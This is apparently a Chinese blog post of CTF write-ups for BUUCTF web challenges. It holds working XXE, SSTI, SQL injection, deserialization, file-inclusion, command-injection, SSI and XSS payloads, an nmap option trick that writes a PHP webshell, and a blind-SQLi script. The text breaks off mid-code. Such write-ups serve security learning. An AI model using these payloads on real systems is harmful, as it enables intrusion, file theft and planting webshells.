主配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx 配置文件目录为：/usr/local/nginx/conf/nginx.conf //这题要用到的路径 这里要读取的是文件，所以使用的file协议 直接够造 123file://suctf.cc/usr/local/nginx/conf/nginx.conf利用漏洞改为file://suctf.c℆sr/local/nginx/conf/nginx.conf 给出flag路径 123456server &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; # location /flag &#123; # alias /usr/fffffflag; # &#125; &#125; 构造file://suctf.c℆sr/fffffflag拿到flag 为了直观感受url处理过程，写了脚本 123456789101112131415from urllib import parsefrom urllib.parse import urlsplit, urlunspliturl= &quot;file://suctf.c℆sr/local/nginx/conf/nginx.conf&quot;host = parse.urlparse(url).hostname#print(host)parts = list(urlsplit(url))print(parts)newhost=[]for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;))print(newhost)parts[1] = &#x27;.&#x27;.join(newhost)print(parts)finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0]print(finalUrl) 结果 1234[&#x27;file&#x27;, &#x27;suctf.c℆sr&#x27;, &#x27;/local/nginx/conf/nginx.conf&#x27;, &#x27;&#x27;, &#x27;&#x27;][&#x27;suctf&#x27;, &#x27;cc/usr&#x27;][&#x27;file&#x27;, &#x27;suctf.cc/usr&#x27;, &#x27;/local/nginx/conf/nginx.conf&#x27;, &#x27;&#x27;, &#x27;&#x27;]file://suctf.cc/usr/local/nginx/conf/nginx.conf 找出类似可用字符的脚本 12345678910# coding:utf-8for i in range(128,65537): tmp=chr(i) try: res = tmp.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;) if(&quot;-&quot;) in res: continue print(&quot;U:&#123;&#125; A:&#123;&#125; ascii:&#123;&#125; &quot;.format(tmp, res, i)) except: pass 参考： https://blog.csdn.net/qq_42181428/article/details/99741920 [NCTF2019]Fake XML cookbookxxe攻击 抓包显示的结果是 1&lt;user&gt;&lt;username&gt;a&lt;/username&gt;&lt;password&gt;aa&lt;/password&gt;&lt;/user&gt; 是xml格式的数据，所以可能存在xxe漏洞（外部实体注入），即利用输入位置向存储的表中添加一个外部实体，让这个实体包含内部文件，造成数据泄露。 xml注入是利用闭合标签改写XML文件实现更改数据，xxe是引用外部实体来达到目的。 php引用外部实体，常见的协议 123file://文件绝对路径 如：file:///etc/passwdhttp://url/file.txtphp://filter/read=convert.base64-encode/resource=xxx.php 这篇博客写的很清楚，传送门 直接构造payload，拿到flag 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;aa&lt;/password&gt;&lt;/user&gt; 这里的file是外部实体 &file; 这里的&amp;file是xml中的参数 还可以用php://filter/read=convert.base64-encode/resource=xxx.php,读取源码 直接构造 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=doLogin.php&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;aa&lt;/password&gt;&lt;/user&gt; 解码后的源码，可以拿到admin和密码，但是登录也没啥东西，考察点就是xxe。。。 123456789101112131415161718192021222324252627282930313233&lt;?php/*** autor: c0ny1* date: 2018-2-7*/$USERNAME = &#x27;admin&#x27;; //璐﹀彿$PASSWORD = &#x27;024b87931a03f738fff6693ce0a78c88&#x27;; //瀵嗙爜$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);try&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); &#125;else&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); &#125; &#125;catch(Exception $e)&#123; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);echo $result;?&gt; [GXYCTF2019]禁止套娃.git源码泄露 12345678910111213141516171819202122232425&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;还差一点哦！&quot;); &#125; &#125; else&#123; die(&quot;再好好想想！&quot;); &#125; &#125; else&#123; die(&quot;还想读flag，臭弟弟！&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; 第一个if：常用的伪协议被禁了 第二个if正则匹配，?R 表示引用当前表达式，就比如引用一次：[a-z,_]+[a-z,_]+\\((?R)?\\)，所以一个合法的表达式可以是a(b();)，括号和字符组成的 第三个if就过滤一些函数包含的字符，导致了许多函数无法使用。 1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。 2.过滤了常用的几个伪协议，不能以伪协议读取文件。 3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。 4.正则匹配掉了et/na/info等关键字，很多函数都用不了。 5：eval($_GET[‘exp’]); 考察点无参RCE exp： 1?exp=highlight_file(next(array_reverse(scandir(current(localeconv()))))); 这里用到反转函数是因为，flag.php在倒数第二个位置，无法使用end()获取，反转后可以直接受用next()获取，方便很多。 localeconv() 函数返回一包含本地数字及货币格式信息的数组。 current() 函数返回数组中的当前元素的值。 每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。 提示：该函数不会移动数组内部指针。要做到这一点，请使用 next() 和 prev() 函数。 相关的方法： end() - 将内部指针指向数组中的最后一个元素，并输出 next() - 将内部指针指向数组中的下一个元素，并输出 prev() - 将内部指针指向数组中的上一个元素，并输出 reset() - 将内部指针指向数组中的第一个元素，并输出 each() - 返回当前元素的键名和键值，并将内部指针向前移动 array_reverse() 函数以相反的元素顺序返回数组。 array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。 如果第二个参数指定为 true，则元素的键名保持不变，否则键名将丢失。 详情 array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。 array_flip() 函数返回一个反转后的数组，如果同一值出现了多次，则最后一个键名将作为它的值，所有其他的键名都将丢失。 如果原数组中的值的数据类型不是字符串或整数，函数将报错。 [BJDCTF2020]Cookie is so stable首先再hint.php中发现了提示 于是抓包看看cookie是啥，在flag.php页面随便登录后cookie后半段的值为用户名，尝试了sql注入，命令执行，都不是，于是试试了模板注入 user=8，出现下图的样子，说明了括号中的表达式被执行了，所以确定是模板注入 下面就是要找到读取flag的payload 在网上找到了一个将模板注入说的很详细的博客，传送门 下面需要判断这个题目是哪个类型的模板，结合下面的图片做测试 1user=admin&#123;&#123;1*2&#125;&#125;*&#123;&#123;2*3&#125;&#125; 结果回显的是hellow admin2*6，正好是上面图片的第一种情况，所以就是Twig模板 找到payload： 1&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125; 参考:一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n’s Blog [SWPU2019]Web1注册账号登录后，可以申请发布广告，在这个页面可以发现存在一个xxs，但是好像没法直接利用 测试是否存在sql注入 在申请广告是输入标题1&#39;111，提交正常，但是当查看广告详情的时候出现了报错页面，这也说明了存在sql注入,而且是二次注入 0x1sql注入 查看列数，空格是被加入了黑名单，使用/**/代替空格，一直加到了22才出现回显。 11&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27; 接下来就是查询库名，直接使用常规的查询方法会发现存在waf，无法使用，猜测可能是过滤or这个关键词，导致了information也被过滤了，那就换另外一种方法 12select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema=schema() 最后找到 了这个方法 11&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27; 接下来就是获取列名，但是常规的方法还是不能用，应为还是存在information 那就使用一种新的查询方法，无列名查询 刚开始以为flag放在FLAG_TABLE中，但是提示不存在这个表，又试了试users表，在第三列读到了flag 一开始以为users表的结构是两列，但是注入时会报错，说明不是两列，测试三列时就正常了，说明时三列 查到第三列的时候看到了flag,payload如下 11&#x27;/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)b),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27; 参考：https://www.jianshu.com/p/dc9af4ca2d06 [安洵杯 2019]easy_serialize_php12345678910111213141516171819202122232425262728293031323334353637&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 第33行代码提示了phpinfo中有隐藏的东西，GET提交f=phpinfo，会在里面找到一个文件的名字d0g3_f1ag.php 那么接下来的目的就是通过一些方法读取到里面的信息。可以看到最后一行存在一个 file_get_content函数，结合题目标题，可以猜到是反序列化加文件读取的题目。 0x1代码审计 代码最后一行有一个file_get_contents是能够读取文件的函数，他这里读取的是base64解密的’img’,往前找这个’img’，可以发现如果我们有传入img_path，它会经过sha1加密，导致目标路径失效。如果我们没有传入img_path，那么后台将默认赋值为guest_img.png的base64编码。这样看来这个$userinfo[&#39;img&#39;]并不是我们可控的，此时需要把注意力转移到另外一个函数serialize上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，就是数组里提到的&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;都会被空格替代，而这层过滤函数会干扰序列化后的数据。 0x2php反序列化字符逃逸 利用过滤函数而导致序列化结果产生新的结果，之前写过类似的文章 这里重新构造出的序列化值为： 1a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125; 可以看到 真正的$_SESSION[&quot;img&quot;]=&#39;L2QwZzNfZmxsbGxsbGFn&#39;; 被抛弃掉了。这是因为我们在构造这段字符时是设计好长度的，s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;，这里的 } 与之前的 { 闭合，让反序列提前结束，从而看到反序列化的内容为 123456[&quot;user&quot;]=&gt;string(24) &quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;[&quot;img&quot;]=&gt;string(20) &quot;ZDBnM19mMWFnLnBocA==&quot;[&quot;dd&quot;]=&gt;string(1) &quot;a&quot; 根据上面的构造方法，那么就可以将img字段的值改为phpinfo中给的文件名的base64值，从而读取其内容 构造payload 12get:f=show_imagepost:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125; 提示了flag在这个文件中，那就将上面的img字段值换成这个文件名的base64值 1base64(/d0g3_fllllllag) = L2QwZzNfZmxsbGxsbGFn payload: 1get:f=show_image post:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125; [BSidesCF 2020]Had a bad day进入题目页面发现页面可以切换，并且url最后的参数也在改变，猜测可能存在文件包含 利用php://filter读取到index的源码 123456789101112&lt;?php$file = $_GET[&#x27;category&#x27;];if(isset($file))&#123; if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#x27;.php&#x27;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125;&#125;?&gt; 看上面的代码可以知道提交的文件必须包含 woofers,neowers,index中的一个才行 猜测flag放在flag.php中，尝试访问，看看有什么回显 1?category=meowers/../flag 源码中出现了之前没有的内容，说明flag.php被包含进来了，那么就想办法读取到flag.php 想到的方法肯定还是上面堆区index源码的方法 php://filter/read=convert.base64-encode/resource=flag 但是这个没法绕过if语句的判断，所以需要嵌套一个符合的flie payload: 1?category=php://filter/read=convert.base64-encode/woofers/resource=flag [WesternCTF2018]shrine123456789101112131415161718192021222324252627import flaskimport osapp = flask.Flask(__name__)app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)@app.route(&#x27;/&#x27;)def index(): return open(__file__).read()@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)def shrine(shrine): def safe_jinja(s): s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;) blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == &#x27;__main__&#x27;: app.run(debug=True) 可以看到给了两个路由，一个是显示主页内容，一个响应用户请求信息。 可以看到 jinja,这些都是在模板引擎中有的东西，猜测是SSTi 访问 1/shrine/&#123;&#123;2*4&#125;&#125; 页面显示了 2 * 4 的结果，说明就是模板引擎注入。 继续看源码，首先app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)注册了名为FLAG的config，这个应该就是flag 但是在 safe_jinja中将config和self加入了黑名单，并且过滤了 ( )，导致我们无法直接使用&#123;&#123;config&#125;&#125;查看 不过python还有一些内置函数，比如url_for和get_flashed_messages 1/shrine/&#123;&#123;url_for.__globals__&#125;&#125; current_app意思应该是当前app，那我们就当前app下的config 1/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125; 参考链接： https://www.cnblogs.com/wangtanzhi/p/12238779.html [WUSTCTF2020]朴实无华扫描目录看到robots.txt，进去看到了 /fAke_f1agggg.php，访问并在响应头中 123456789101112131415161718192021222324252627282930313233343536//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;金钱解决不了穷人的本质问题&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5($md5)) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); &#125;else&#123; die(&quot;快到非洲了&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125; 第一关利用intval处理十六进制字符串的漏洞，当intval(‘0x1’) =0，而intval(‘0x1’+1) = 2 所以构造payload: 1num = 0x2222 第二关使得 $md5==md5($md5)成立，因为使用的是弱比较，所以容易找到这样的字符串，python脚本如下 1234567891011121314151617import hashlibdef md5(str): m = hashlib.md5() m.update(str.encode(&quot;utf8&quot;)) #print(m.hexdigest()) return m.hexdigest()for i in range(999999999): md = &#x27;0e&#x27; md = md + str(i) md1 = md5(md) md1 = str(md1) print(i) if md1[:2] == &#x27;0e&#x27; and md1[2:].isdigit(): print(md) break 最后找到的字符串是 0e215962017，跑的时间有点长，耐心等待 第三关，过滤了空格，cat 可以用$IFS$9和more或者less替换 先用ls命令查看目录 1num=0x1234&amp;md5=0e215962017&amp;get_flag=ls 读取flag，最后的payload 1num=0x1234&amp;md5=0e215962017&amp;get_flag=more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag [NPUCTF2020]ReadlezPHP查看源码可以看到一个time.php，直接给出了源码 1234567891011121314151617181920212223242526&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); 很明显是反序列化 看到 12345public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a);&#125; 重点是echo $b($a),本地测试一下，发现这样是可以的 所以就序列化出一个这样的对象然后去读取文件即可 1O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;ls&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;&#125; 刚开始构造的payload是想着列出目录，但是发现根本列不出目录，所以flag，应该没有放在根目录，于是再尝试读取phpinfo 使用assert结合phpinfo()，原理如下 最后的payload： 1?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125; 在phpinfo中搜索flag即可 [网鼎杯 2020 朱雀组]Nmap进入主页可以看到一个输入IP输入框，尝试输入127.0.0.1 结果是显示了扫描结果 猜测后台的php代码应该是类似这样 1system(&quot;nmap -sP&quot;.$host); 而这里使用 了system函数，所以会存在命令执行，在namp参数中 -oN 可以将扫描结果存放到指定的文件中，所以可以利用这个参数写入一句话木马 本地测试一下 可以看到上面的一句话木马已经写入到了1.php，那么久可以用这个方法做这题 使用下面的payload 但是回显了hacker，直接在输入框中输入php，也是回显haceker，所以应该是过滤了php，那就换一个一句话木马 1&#x27; -oN b.phtml &lt;?=eval($_POST[a]);?&gt;&#x27; 访问 /b.phtml，发现是可以访问的，所以蚁剑链接，拿到flag [BJDCTF2020]EasySearch扫描目录可以发现网页备份文件index.php.swp 1234567891011121314151617181920212223242526272829303132&lt;?php ob_start(); function get_hash()&#123; $chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; ) &#123; $admin = &#x27;6d0bc1&#x27;; if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123; echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &#x27; *** *** &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt; *** ***&#x27;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;; &#125;else?&gt; 代码审计 1.第一个函数，是生成文件名，最后使用一个sha1函数，让文件名固定为32位 2.之后的第一个if语句的判断，username值不能位空 3.第二个password的md5值前六位等于 “6d0bc1” 4.之后的利用生成文件名的函数，生成一个文件(shtml)，并打开文件向其中写入$text 5.其中的username的值被带入$text中，所以这里存在注入 Apache SSI 远程命令执行漏洞 当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用&lt;!--#exec cmd=&quot;id&quot;--&gt;语法执行命令。 使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。 1.绕过第一个if语句 1$admin == substr(md5($_POST[&#x27;password&#x27;]),0,6) 利用脚本找到两个 12513027752020666 2.在network中找到生成的文件 3.命令注入 首先列出目录 1&lt;!--#exec cmd=&quot;ls ../&quot;--&gt; 可以看到flag_990c66bf85a09c664f0b6741840499b2，直接访问，即可拿到flag [BJDCTF 2nd]xss之光扫描目录发现 /.git文件，git源码泄露，githack下载源码 123&lt;?php$a = $_GET[&#x27;yds_is_so_beautiful&#x27;];echo unserialize($a); 源码很简单，就是get提交一个参数后，进行反序列化，但是没有给出序列化过程，不知道类的结构 php原生类利用 123&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);echo urlencode(serialize($a)); 序列化后的内容为 1O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D 提交可以发现弹出了提示，说明构造成功了 但是并没有出现flag 结合题目提示构造xss 123&lt;?php$a = new Exception(&quot;&lt;script&gt;window.location.href=&#x27;https://www.baidu.com&#x27;&lt;/script&gt;&quot;);echo urlencode(serialize($a)); payload: 1O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A61%3A%22%3Cscript%3Ewindow.location.href%3D%27https%3A%2F%2Fwww.baidu.com%27%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A43%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Ctest%5Ccumt11.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D 提交后就在响应头中出现flag","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"ssrf","slug":"ssrf","permalink":"https://sunzhengyu99.github.io/tags/ssrf/"},{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"},{"name":"system","slug":"system","permalink":"https://sunzhengyu99.github.io/tags/system/"}]},{"title":"buuctf-sql注入","date":"2020-10-05T10:29:30.000Z","path":"2020/10/05/buuoj/","text":"buuctf–注入篇 [CISCN2019 华北赛区 Day2 Web1]Hack World给了提示，All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39; 猜测flag在flag 表中，查询语句应该是 select flag from flag 经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注 构造盲注语句 id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2) 两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。 12345678910111213141516171819202122232425// 二分注入import requestsurl = &quot;http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php&quot;data = &#123;id : &quot;&quot;&#125;flag = &quot;&quot;for i in range(50): left = 33 right = 128 mid = (right + left) &gt;&gt; 1 while(right&gt;left): data[&quot;id&quot;] = &quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)&quot;.format(i,mid) response = requests.post(url,data=data) if &quot;Hello&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag)print(flag) [极客大挑战 2019]HardSQL报错注入 测试发现or,union,substr,空格,/**/等都被加入黑名单，双写也无法绕过 可是使用报错注入 报错注入原理： 其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。 相关链接 https://www.cnblogs.com/richardlee97/p/10617115.html https://www.jianshu.com/p/d8ae3e8dabdc https://blog.csdn.net/qq_37873738/article/details/88042610 UPDATEXML (XML_document, XPath_string, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) 。第三个参数：new_value，String格式，替换查找到的符合条件的数据 查询语句如下 12345?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))%23?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23 这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来 显示后面的flag 1?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e),1))%23 [网鼎杯 2018]Fakebooksql注入+反序列化+代码审计 [GXYCTF2019]BabySQli下载的源码，有助于后面做题 123456789101112131415161718192021222324252627282930313233mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);$name = $_POST[&#x27;name&#x27;];$password = $_POST[&#x27;pw&#x27;];$t_pw = md5($password); //对传入的password参数进行了md5加密$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;// echo $sql;$result = mysqli_query($con, 